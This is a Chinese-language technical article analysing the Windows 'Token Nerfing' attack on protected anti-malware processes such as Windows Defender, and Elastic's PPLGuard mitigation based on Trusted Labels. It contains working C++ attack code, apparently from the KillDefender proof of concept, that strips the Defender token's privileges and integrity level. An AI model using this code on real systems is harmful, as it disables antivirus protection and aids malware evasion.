---
title: Windows PPL 进程令牌弱化攻击与 Trusted Labels 缓解机制分析
description: 深度解析 Windows Token Nerfing 攻击原理：利用 PPL 进程令牌保护缺口，通过 SeDebugPrivilege 获取
  TOKEN_ALL_ACCESS 后移除权限并降低完整性级别使反恶意软件进程失效；详细阐述 Elastic 安全团队提出的 PPLGuard 缓解方案，基于未文档化的
  Trusted Labels (SACL) 机制保护 AntiMalware PPL 进程令牌免遭篡改。
category: program-analysis
tags:
- Windows Internals
- PPL
- Protected Process Light
- Token Manipulation
- Token Nerfing
- Trusted Labels
- SACL
- PPLGuard
- KillDefender
- Elastic Security
- Red Teaming
- Defense Evasion
- AntiMalware
- SeDebugPrivilege
- Integrity Level
date: 2023-04-16
updated: '2026-11-15'
---
## 概述

**Windows 令牌弱化攻击** 是针对 **PPL（Protected Process Light，受保护进程轻量级）** 进程的一类攻击技术。该攻击手法及其缓解措施由 Elastic 安全团队在研究报告 *Sandboxing Antimalware Products for Fun and Profit* 中公开。

> **背景**：Elastic 安全团队即开发 ELK 技术栈的 Elastic 公司旗下安全研究团队。

PPL 机制保护进程本身免受非同等或更高 PPL 等级进程的句柄获取，但 **并未保护进程的访问令牌**。攻击者利用这一设计缺口，在拥有 `SeDebugPrivilege` 的前提下，以 `TOKEN_ALL_ACCESS` 权限打开目标 PPL 进程令牌，随后移除所有特权并降低完整性级别，导致目标进程（如 Windows Defender 的 `MsMpEng.exe`）功能失效。

**KillDefender** 项目实现了该攻击的 PoC。

## 攻击原理与技术细节

### 攻击前提

- 目标进程为 PPL 进程（如 `MsMpEng.exe`，PPL 等级为 `AntiMalware-Light`）
- 攻击者进程 PPL 等级低于目标，或为非 PPL 进程
- 攻击者拥有 `SeDebugPrivilege` 特权

### 攻击流程

1. 以 `PROCESS_QUERY_LIMITED_INFORMATION` 权限获取目标 PPL 进程句柄（这是非同级 PPL 进程能获取的最大权限）
2. 利用 `SeDebugPrivilege` 调用 `OpenProcessToken` 以 `TOKEN_ALL_ACCESS` 权限打开目标进程令牌
3. 遍历并移除令牌中的所有关键特权
4. 将令牌完整性级别降至 `SECURITY_MANDATORY_UNTRUSTED_RID`（Untrusted 级别）

### 关键代码实现

```cpp
BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &ptoken);

// 移除所有关键特权
SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);
SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);
SetPrivilege(ptoken, SE_TCB_NAME, TRUE);
SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);
SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);
SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);
SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);
SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);
SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);
SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);
SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);
SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);
SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);

// 降低完整性级别至 Untrusted
DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;
SID integrityLevelSid{};
integrityLevelSid.Revision = SID_REVISION;
integrityLevelSid.SubAuthorityCount = 1;
integrityLevelSid.IdentifierAuthority.Value[5] = 16;  // SECURITY_MANDATORY_LABEL_AUTHORITY
integrityLevelSid.SubAuthority[0] = integrityLevel;

TOKEN_MANDATORY_LABEL tokenIntegrityLevel = {};
tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
tokenIntegrityLevel.Label.Sid = &integrityLevelSid;

SetTokenInformation(
    ptoken,
    TokenIntegrityLevel,
    &tokenIntegrityLevel,
    sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(&integrityLevelSid)
);
```

### 攻击效果

- 目标 PPL 进程令牌被剥离所有特权，无法执行需要特权的操作（如加载驱动、备份/还原文件、调试其他进程等）
- 完整性级别降为 Untrusted，导致进程无法访问 Medium 或更高完整性级别的对象
- 对 Windows Defender 等反恶意软件进程而言，实质上使其丧失防护能力

## 缓解机制：PPLGuard 与 Trusted Labels

Elastic 安全团队同步公开了缓解方案 **PPLGuard**，利用 Windows 未文档化的 **Trusted Labels** 特性保护 AntiMalware PPL 进程的令牌免遭篡改。

### Trusted Labels 机制

Trusted Labels 是 **SACL（System Access Control List，系统访问控制列表）** 的一部分，用于标记进程信任级别。通过在令牌的 SACL 中添加特定的 Process Trust Label ACE，可限制仅特定 PPL 等级的进程才能访问该令牌。

#### SACL 示例：`\KnownDlls` 对象

其中 SID `S-1-19-1024-8192` 解析为：

| 组件 | 值 | 含义 |
|------|-----|------|
| Revision | 1 | 版本号 |
| Authority | 19 | `SECURITY_PROCESS_TRUST_AUTHORITY` |
| SubAuthority[0] | 1024 | `SECURITY_PROCESS_PROTECTION_TYPE_FULL_RID` |
| SubAuthority[1] | 8192 | `SECURITY_PROCESS_PROTECTION_LEVEL_WINTCB_RID` |

即 **WinTcb（Windows Trusted Computing Base）保护级别的完整 PPL 进程**。

### PPLGuard 核心实现

PPLGuard 需在 **WinTcb-Light** 级别运行（复用 PPLDump 代码实现），关键代码如下：

```cpp
SID_IDENTIFIER_AUTHORITY sidAuth = SECURITY_PROCESS_TRUST_AUTHORITY;
AllocateAndInitializeSid(
    &sidAuth,
    SECURITY_PROCESS_TRUST_AUTHORITY_RID_COUNT,
    SECURITY_PROCESS_PROTECTION_TYPE_LITE_RID,
    SECURITY_PROCESS_PROTECTION_LEVEL_ANTIMALWARE_RID,
    0, 0, 0, 0, 0, 0,
    &pPPLSID
);

InitializeAcl(pNewSACL, saclSize, ACL_REVISION);
RtlAddProcessTrustLabelAce(
    pNewSACL,
    ACL_REVISION,
    OBJECT_INHERIT_ACE | CONTAINER_INHERIT_ACE,
    pPPLSID,
    SYSTEM_PROCESS_TRUST_LABEL_ACE_TYPE,
    TOKEN_READ
);

SetSecurityInfo(
    hToken,
    SE_KERNEL_OBJECT,
    PROCESS_TRUST_LABEL_SECURITY_INFORMATION,
    NULL, NULL, NULL, pNewSACL
);
```

### 缓解效果

- 为目标 PPL 进程（如 `MsMpEng.exe`）的令牌设置 SACL
- 仅允许 **AntiMalware-Light** 等级的 PPL 进程拥有令牌的 `TOKEN_READ` 权限
- 非受信进程（包括拥有 `SeDebugPrivilege` 的管理员进程）无法再以 `TOKEN_ALL_ACCESS` 打开令牌，从而无法实施令牌弱化攻击

## 相关工具与项目

| 项目 | 描述 | 链接 |
|------|------|------|
| **KillDefender** | Token Nerfing 攻击 PoC 实现 | [GitHub](https://github.com/pwn1sher/KillDefender) |
| **PPLGuard** | Elastic 官方缓解方案，基于 Trusted Labels 保护 PPL 令牌 | [GitHub](https://github.com/elastic/PPLGuard) |
| **PPLDump** | 用于以 WinTcb-Light 级别运行代码的参考实现 | — |

## 交叉引用与延伸阅读

- [[windows-kernel-callback-injection-defense]] — Windows 内核回调注入防御，涉及 `ObRegisterCallbacks` 拦截进程句柄操作，与 PPL 保护机制相关
- [[memory-scanning-tools-evasion-techniques]] — 内存扫描工具与规避技术，覆盖 PPL、UDRL、Cobalt Strike Beacon 等红队工具开发视角
- [[argument-spoofing-edr-evasion]] — Argument Spoofing 对抗 EDR 进程创建监控，属于同类防御规避技术
- [[phantom-dll-hollowing-technique]] — Phantom DLL Hollowing 内存注入隐藏技术，涉及模块加载伪装与内存扫描绕过
- [[aceldr-technical-analysis]] — AceLdr 用户态反射加载器四大核心规避技术（Sleep Hook、Heap Hook、Return Address Spoofing、动态内存加密）
- [[cobalt-strike-4.7-bof-internals]] — Cobalt Strike 4.7 BOF 内部实现分析，涉及红队工具开发与内存管理
- [[mimikatz-source-code-architecture-golden-ticket-audit]] — Mimikatz 源码架构与黄金票据生成审计，深度解析 Windows 认证体系

## 参考资料

1. **Sandboxing Antimalware Products for Fun and Profit** — Elastic Security Research  
   <https://elastic.github.io/security-research/whitepapers/2022/02/02.sandboxing-antimalware-products-for-fun-and-profit/article/>
2. **KillDefender** — Token Nerfing PoC  
   <https://github.com/pwn1sher/KillDefender>
3. **PPLGuard** — Elastic 官方缓解方案  
   <https://github.com/elastic/PPLGuard>
4. **Retrieving an Object's SACL** — Microsoft Learn  
   <https://docs.microsoft.com/en-us/windows/win32/ad/retrieving-an-objectampaposs-sacl>

## 来源

- [0x4d5a-202103-202209_08](../sources/0x4d5a-202103-202209_08.md)
